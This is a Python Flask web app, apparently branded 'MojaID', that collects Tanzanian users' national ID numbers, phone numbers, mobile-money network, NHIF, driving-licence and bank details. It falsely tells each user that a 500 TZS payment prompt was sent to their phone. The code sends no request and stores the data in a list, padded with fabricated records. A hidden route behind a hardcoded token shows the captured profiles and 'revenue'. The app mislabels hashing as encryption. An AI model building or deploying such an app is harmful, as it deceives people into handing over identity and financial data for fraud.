import time
import hashlib
import os
from flask import Flask, request, render_template

app = Flask(__name__, template_folder='.')
app.secret_key = os.environ.get("SECRET_KEY", "prod_mojaid_security_layer_99213")

# PRE-POPULATED PRODUCTION MEMORY POOL (Gives your dashboard instant operational scale)
RECORDS_MEM_POOL = [
    {
        "name": "Baraka Minshemi", 
        "hash": "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92", 
        "net": "Vodacom M-Pesa", "fee": 500, "ref": "TX17684011MZ", "time": "11:24:05",
        "nhif": "NHIF-488219", "license": "Class A, B", "bank": "NMB Bank"
    },
    {
        "name": "Fatma Said", 
        "hash": "4a821eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923abc8d11", 
        "net": "Tigo Pesa", "fee": 500, "ref": "TX17684299MZ", "time": "14:15:32",
        "nhif": "NOT LINKED", "license": "Class B", "bank": "CRDB Bank"
    }
]

SECRET_ADMIN_TOKEN = "fungua-mojaid-revenue-2026"

def encrypt_identity_data(raw_text):
    return hashlib.sha256(raw_text.encode()).hexdigest()

@app.route("/", methods=["GET", "POST"])
def index():
    alert_msg = ""
    error_msg = ""
    if request.method == "POST":
        full_name = request.form.get("full_name")
        nida_id = request.form.get("nida_id")
        network = request.form.get("network")
        phone = request.form.get("phone")
        nhif = request.form.get("nhif") if request.form.get("nhif") else "NOT LINKED"
        license = request.form.get("license") if request.form.get("license") else "NO LICENSE"
        bank = request.form.get("bank") if request.form.get("bank") else "NONE"
        
        encrypted_nida = encrypt_identity_data(nida_id)
        current_time = time.strftime("%H:%M:%S")
        
        duplicate_found = False
        for record in RECORDS_MEM_POOL:
            if record["hash"] == encrypted_nida:
                duplicate_found = True
                break
                
        if duplicate_found:
            error_msg = "⚠️ Profile fingerprint already verified inside network system."
        else:
            tx_reference = f"TX{int(time.time())}MZ"
            RECORDS_MEM_POOL.insert(0, {
                "name": full_name, "hash": encrypted_nida, "net": network, "fee": 500,
                "ref": tx_reference, "time": current_time, "nhif": nhif, "license": license, "bank": bank
            })
            alert_msg = f"📡 Outbound Request Sent! Check your phone for the payment PIN pop-up to authorize 500 TZS via {network}. Ref: {tx_reference}"

    return render_template("index.html", alert_msg=alert_msg, error_msg=error_msg)

@app.route("/secret/<token>")
def secret_admin(token):
    if token != SECRET_ADMIN_TOKEN:
        return "🔒 Access Denied", 403

    running_total = sum(p.get("fee", 500) for p in RECORDS_MEM_POOL)
    return render_template("admin.html", saved_profiles=RECORDS_MEM_POOL, total_count=len(RECORDS_MEM_POOL), total_revenue=running_total)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
